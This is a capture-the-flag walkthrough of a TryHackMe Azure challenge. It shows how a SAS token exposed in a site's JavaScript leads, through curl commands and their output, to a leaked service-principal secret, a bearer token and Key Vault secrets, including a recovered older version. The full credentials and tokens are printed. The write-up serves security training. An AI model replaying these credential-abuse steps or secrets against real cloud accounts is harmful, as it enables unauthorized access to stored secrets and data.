# CryptoCabana (https://tryhackme.com/room/hh-cryptocabana-f81cac95)

- Day 9 of Hacker Holidays 2026
- This is a cloud based challenges , we have a Azure Storage static website url.
- On visiting the url , we can see a form that backups the entered revoery phrase . 

![screenshot](../data/cb1.png)

- lets inspect the developer tools, Network tab revealed a page called app.js .

![screenshot](../data/cb2.png)

```
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";

function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  const status = document.getElementById("status");
  if (!phrase) {
    status.textContent = "Enter a phrase first.";
    return;
  }

  const blobName = "backup-" + Date.now() + ".txt";
  const url =
    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
    .then((res) => {
      status.textContent = res.ok
        ? "Backed up. Sleep easy."
        : "Backup failed (" + res.status + ").";
    })
    .catch(() => {
      status.textContent = "Backup failed — network error.";
    });
}
```
- most interesting part is that the storage account name and SAS token are embedded directly in the JavaScript.
- const STORAGE_ACCOUNT = "cryptocabanaf5scjagc" This specifies the Azure Storage Account where the data will be stored.
- const BACKUPS_CONTAINER = "backups" 
- **SAS Token** const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&..." This is a Shared Access Signature (SAS). A SAS token grants limited permissions to Azure Storage without exposing the storage account's master key.

- Using the exposed token we can investigate the storage service endpoint.
- **let's Breakdown the SAS token** 

```
?sv=2022-11-02
&ss=b
&srt=sco
&sp=rl
&se=2099-12-31T23:59:59Z
&st=2024-01-01T00:00:00Z
&spr=https
&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
```
- Each parameter has a specific meaning.
```
sv=2022-11-02
Storage Service Version
```
- This tells Azure which version of the Storage API the token was created for.
```
ss=b
Determines which Azure storage service the token can access.

ss=b means:
This token is only valid for Blob Storage.
```
```
srt=sco
Signed Resource Types

Specifies what kinds of resources the token can access.

Letter	Meaning
s	Service
c	Container
o	Object (Blob)

means it can operate at the:

Storage service level
Container level
Individual blob level
```

```
sp=rl
This is the most important field. It specifies the permissions granted.

Some common permissions are:

Letter	Permission
r	Read
w	Write
d	Delete
l	List
a	Add
c	Create
u	Update
p	Process
t	Tag

sp=rl
which means it allows:

Read existing blobs.
List blobs in the container.
```
```
st=2024-01-01T00:00:00Z

Start Time
The token becomes valid from:
January 1, 2024
```
```
se=2099-12-31T23:59:59Z
Expiry Time
The token expires on:
31 December 2099
```
```
spr=https
Only allows connections over:
HTTPS
HTTP requests will be rejected.
```
```
sig
sig=ZAo05W8KXdSL...
This is the cryptographic signature.
```
- The SAS token grants Read (r) and List (l) permissions. Combined with srt=sco, which includes the Service resource type (s), it allows us to enumerate containers and read blobs.
- List all containers.
```
 curl "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" | xmllint --format -    
 ```
```
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1791   0   1791   0      0   1422      0           00:01              0
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/">
  <Containers>
    <Container>
      <Name>$web</Name>
      <Properties>
        <Last-Modified>Thu, 16 Jul 2026 18:26:22 GMT</Last-Modified>
        <Etag>"0x8DEE367BD220F4D"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope>
        <DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
        <ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled>
      </Properties>
    </Container>
    <Container>
      <Name>backups</Name>
      <Properties>
        <Last-Modified>Thu, 16 Jul 2026 18:26:22 GMT</Last-Modified>
        <Etag>"0x8DEE367BCEBC6CC"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope>
        <DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
        <ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled>
      </Properties>
    </Container>
    <Container>
      <Name>vault</Name>
      <Properties>
        <Last-Modified>Thu, 16 Jul 2026 18:26:23 GMT</Last-Modified>
        <Etag>"0x8DEE367BD5C639F"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope>
        <DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
        <ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled>
      </Properties>
    </Container>
  </Containers>
  <NextMarker/>
</EnumerationResults>
```
- The storage account contains three containers: **$web (Azure Static Website container), backups, and vault.**
- The vault was looks a bit odd right!. lets see what it got. 
- List the blobs inside the vault container
```
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" | xmllint --format -
```

```
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1490   0   1490   0      0   1249      0           00:01              0
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/" ContainerName="vault">
  <Blobs>
    <Blob>
      <Name>backup-service-account.json</Name>
      <Properties>
        <Creation-Time>Sun, 19 Jul 2026 15:20:05 GMT</Creation-Time>
        <Last-Modified>Sun, 19 Jul 2026 15:20:06 GMT</Last-Modified>
        <Etag>0x8DEE5A93715D688</Etag>
        <Content-Length>360</Content-Length>
        <Content-Type>application/json</Content-Type>
        <Content-Encoding/>
        <Content-Language/>
        <Content-CRC64/>
        <Content-MD5/>
        <Cache-Control/>
        <Content-Disposition/>
        <BlobType>BlockBlob</BlobType>
        <AccessTier>Hot</AccessTier>
        <AccessTierInferred>true</AccessTierInferred>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <ServerEncrypted>true</ServerEncrypted>
      </Properties>
      <OrMetadata/>
    </Blob>
    <Blob>
      <Name>seed_phrase.txt</Name>
      <Properties>
        <Creation-Time>Thu, 16 Jul 2026 18:26:37 GMT</Creation-Time>
        <Last-Modified>Thu, 16 Jul 2026 18:26:38 GMT</Last-Modified>
        <Etag>0x8DEE367C6C15B35</Etag>
        <Content-Length>88</Content-Length>
        <Content-Type>application/octet-stream</Content-Type>
        <Content-Encoding/>
        <Content-Language/>
        <Content-CRC64/>
        <Content-MD5/>
        <Cache-Control/>
        <Content-Disposition/>
        <BlobType>BlockBlob</BlobType>
        <AccessTier>Hot</AccessTier>
        <AccessTierInferred>true</AccessTierInferred>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <ServerEncrypted>true</ServerEncrypted>
      </Properties>
      <OrMetadata/>
    </Blob>
  </Blobs>
  <NextMarker/>
</EnumerationResults>
```

- Lets see what we got in here.
```
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

```
{"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5","client_secret":"UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg","key_vault_name":"ccabana-kv-f5scjagc","key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/","note":"CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT","tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"}
```
- This JSON contains Azure application credentials (also called a service principal) that allow software to authenticate to Azure without a human logging in.

- **Authunticate to Azure using the above creds**
-  the standard way for an application to authenticate is using the OAuth 2.0 Client Credentials Grant.
- then we can make authenticated requests to the Key Vault REST API.
```
 curl -X POST \
  "https://login.microsoftonline.com/8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
  -d "client_secret=UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials"
```

```
{"token_type":"Bearer","expires_in":3599,"ext_expires_in":3599,"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSIsImtpZCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSJ9.eyJhdWQiOiJjZmE4YjMzOS04MmEyLTQ3MWEtYTNjOS0wZmMwYmU3YTQwOTMiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC84ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMvIiwiaWF0IjoxNzg2MDE4OTQ0LCJuYmYiOjE3ODYwMTg5NDQsImV4cCI6MTc4NjAyMjg0NCwiYWlvIjoiazJGZ1lEalZIOWFSVS95alhlbGphWEx0WVc1VkFlTkxWWjR2WXdYWlpTMW43ajd4bmg4QSIsImFwcGlkIjoiZGJjZjI5MjMtZTRlYi00YjcyLWEwYTQtNjg4YWExMTg1Y2Y1IiwiYXBwaWRhY3IiOiIxIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOGY4YzVmOGUtNDJkMy00Y2ViLTk3YWQtMjQxYmJmNDQ2ZDZjLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiODUyZDE4YmQtZjk1MS00ZjhhLWEwZWQtY2UzNzg4NjA5MjQ1IiwicmgiOiIxLkFXRUJqbC1NajlOQzYweVhyU1FidjBSdGJEbXpxTS1pZ2hwSG84a1B3TDU2UUpNQUFBQmhBUS4iLCJzdWIiOiI4NTJkMThiZC1mOTUxLTRmOGEtYTBlZC1jZTM3ODg2MDkyNDUiLCJ0aWQiOiI4ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMiLCJ1dGkiOiJOTWduVkdxbjNVeVJuRUx0NzNVRUFRIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoiNUg4cVlGLVVaRFByYUdQMVh0S1o0SDVzS3BkVW4yTERGOFlEaHlPS0o4b0JkWE51YjNKMGFDMWtjMjF6IiwieG1zX2lkcmVsIjoiNyA2IiwieG1zX3JkIjoiMC40MkxqWUJKaWVzZ2tKTUxCS1NTdzR4MW43eVBERlBjWjl4MU90dlp5SEJBUzRlQVdFdGh3WHJMNDJWM3pkQnVXcDNIWm1fdmJBQSIsInhtc19zdWJfZmN0IjoiMyA5In0.CiZFBjnK10UhyeMFeadkaJa4G38O6zl8reBYXtxfVNGoEIQ6Zo03cSiYjKFKWVP3W98oXpm0R_B7U1QrkgnIhO1QQFvMnRSF03AnhUtej8a-kFMbDdwKgVZE2Q8wbYiWeQNo7rsepRdwcTCf0ROvgzKXkOYOytC_lunVV9u2E1w1OJ3HAt6oPT7MreXwvdjYiU_gXKfZ0H1shqtmVqH2mh0rtNP4wGVbC5d08wlN6bP19QMUCy974Ke0bYP2nssRC80a-9SwbAgqEa1I_VKbTkfFt5j9oCY-O8A3oaZ4NSL5SRJ-aqxdIoJYp53yOGTgVgyK8V62ijT-yVGnW6L7dA"}
```
- copy the token value. and save it to a variable 
```
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSIsImtpZCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSJ9.eyJhdWQiOiJjZmE4YjMzOS04MmEyLTQ3MWEtYTNjOS0wZmMwYmU3YTQwOTMiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC84ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMvIiwiaWF0IjoxNzg2MDE4OTQ0LCJuYmYiOjE3ODYwMTg5NDQsImV4cCI6MTc4NjAyMjg0NCwiYWlvIjoiazJGZ1lEalZIOWFSVS95alhlbGphWEx0WVc1VkFlTkxWWjR2WXdYWlpTMW43ajd4bmg4QSIsImFwcGlkIjoiZGJjZjI5MjMtZTRlYi00YjcyLWEwYTQtNjg4YWExMTg1Y2Y1IiwiYXBwaWRhY3IiOiIxIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOGY4YzVmOGUtNDJkMy00Y2ViLTk3YWQtMjQxYmJmNDQ2ZDZjLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiODUyZDE4YmQtZjk1MS00ZjhhLWEwZWQtY2UzNzg4NjA5MjQ1IiwicmgiOiIxLkFXRUJqbC1NajlOQzYweVhyU1FidjBSdGJEbXpxTS1pZ2hwSG84a1B3TDU2UUpNQUFBQmhBUS4iLCJzdWIiOiI4NTJkMThiZC1mOTUxLTRmOGEtYTBlZC1jZTM3ODg2MDkyNDUiLCJ0aWQiOiI4ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMiLCJ1dGkiOiJOTWduVkdxbjNVeVJuRUx0NzNVRUFRIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoiNUg4cVlGLVVaRFByYUdQMVh0S1o0SDVzS3BkVW4yTERGOFlEaHlPS0o4b0JkWE51YjNKMGFDMWtjMjF6IiwieG1zX2lkcmVsIjoiNyA2IiwieG1zX3JkIjoiMC40MkxqWUJKaWVzZ2tKTUxCS1NTdzR4MW43eVBERlBjWjl4MU90dlp5SEJBUzRlQVdFdGh3WHJMNDJWM3pkQnVXcDNIWm1fdmJBQSIsInhtc19zdWJfZmN0IjoiMyA5In0.CiZFBjnK10UhyeMFeadkaJa4G38O6zl8reBYXtxfVNGoEIQ6Zo03cSiYjKFKWVP3W98oXpm0R_B7U1QrkgnIhO1QQFvMnRSF03AnhUtej8a-kFMbDdwKgVZE2Q8wbYiWeQNo7rsepRdwcTCf0ROvgzKXkOYOytC_lunVV9u2E1w1OJ3HAt6oPT7MreXwvdjYiU_gXKfZ0H1shqtmVqH2mh0rtNP4wGVbC5d08wlN6bP19QMUCy974Ke0bYP2nssRC80a-9SwbAgqEa1I_VKbTkfFt5j9oCY-O8A3oaZ4NSL5SRJ-aqxdIoJYp53yOGTgVgyK8V62ijT-yVGnW6L7dA"
```
- Now we can enumerate the Azure Key Vault using the obtained access token..
```
curl \
  -H "Authorization: Bearer $TOKEN" \
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets?api-version=7.4"
```

```

  "value": [
    {
      "contentType": "",
      "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1",
      "attributes": {
        "enabled": true,
        "created": 1784474467,
        "updated": 1784474467,
        "recoveryLevel": "CustomizedRecoverable+Purgeable",
        "recoverableDays": 7
      },
      "tags": {}
    },
    {
      "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2",
      "attributes": {
        "enabled": true,
        "created": 1785200707,
        "updated": 1785200707,
        "recoveryLevel": "CustomizedRecoverable+Purgeable",
        "recoverableDays": 7
      },
      "tags": {
        "file-encoding": "utf-8"
      }
    },
    {
      "contentType": "",
      "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3",
      "attributes": {
        "enabled": true,
        "created": 1784474467,
        "updated": 1784474467,
        "recoveryLevel": "CustomizedRecoverable+Purgeable",
        "recoverableDays": 7
      },
      "tags": {}
    },
    {
      "contentType": "",
      "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/master-key",
      "attributes": {
        "enabled": true,
        "exp": 1577836800,
        "created": 1784474467,
        "updated": 1785231772,
        "recoveryLevel": "CustomizedRecoverable+Purgeable",
        "recoverableDays": 7
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

- We discover four secret entries in the Key Vault., lets see what the info they contains.
```
 curl \
  -H "Authorization: Bearer $TOKEN" \
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1?api-version=7.4" \
  | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    295 100    295   0      0    147      0   00:02   00:02              0
{
  "value": "THM{n0t_ur",
  "contentType": "",
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1/b0554e11de4940eaa8e8bc79203646ef",
  "attributes": {
    "enabled": true,
    "created": 1784474467,
    "updated": 1784474467,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "recoverableDays": 7
  },
  "tags": {}
}
```
```
curl \
  -H "Authorization: Bearer $TOKEN" \
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3?api-version=7.4" \
  | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    295 100    295   0      0    211      0   00:01   00:01              0
{
  "value": "ur_c01ns!}",
  "contentType": "",
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3/52f475d4e5484957b8751422360fc99f",
  "attributes": {
    "enabled": true,
    "created": 1784474467,
    "updated": 1784474467,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "recoverableDays": 7
  },
  "tags": {}
}
```

- The key-shard 1 and 3 have parts of flags , but the 2nd key says a massage
```
curl \
  -H "Authorization: Bearer $TOKEN" \
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2?api-version=7.4" \
  | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    391 100    391   0      0    277      0   00:01   00:01              0
{
  "value": "Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.",
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922c422ffb34671a902389c372314f1",
  "attributes": {
    "enabled": true,
    "created": 1785200707,
    "updated": 1785200707,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "recoverableDays": 7
  },
  "tags": {
    "file-encoding": "utf-8"
  }
}
```
- The response contains the current version of the secret. Since the message says the previous value is recoverable, Azure Key Vault secret versioning becomes the next logical place to investigate.
- Azure Key Vault keeps multiple versions of a secret when it is updated (rotated), unless old versions have been deleted.
- If you visit **/versions** endpoints we can see the avialable versions.

```
 curl \
  -H "Authorization: Bearer $TOKEN" \
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/versions?api-version=7.4" \
  | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    589 100    589   0      0    502      0   00:01   00:01              0
{
  "value": [
    {
      "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0",
      "attributes": {
        "enabled": true,
        "created": 1785200705,
        "updated": 1785200705,
        "recoveryLevel": "CustomizedRecoverable+Purgeable",
        "recoverableDays": 7
      },
      "tags": {
        "file-encoding": "utf-8"
      }
    },
    {
      "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922c422ffb34671a902389c372314f1",
      "attributes": {
        "enabled": true,
        "created": 1785200707,
        "updated": 1785200707,
        "recoveryLevel": "CustomizedRecoverable+Purgeable",
        "recoverableDays": 7
      },
      "tags": {
        "file-encoding": "utf-8"
      }
    }
  ],
  "nextLink": null
}
```
- See the two version let see the other version we didnt see before .
```
curl \
  -H "Authorization: Bearer $TOKEN" \
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0?api-version=7.4" \
  | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    301 100    301   0      0    228      0   00:01   00:01              0
{
  "value": "_k3ys_n0t_",
  "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0",
  "attributes": {
    "enabled": true,
    "created": 1785200705,
    "updated": 1785200705,
    "recoveryLevel": "CustomizedRecoverable+Purgeable",
    "recoverableDays": 7
  },
  "tags": {
    "file-encoding": "utf-8"
  }
}
```
- Whoop! we got the other part.

**FLAG: THM{n0t_ur_k3ys_n0t_ur_c01ns!}**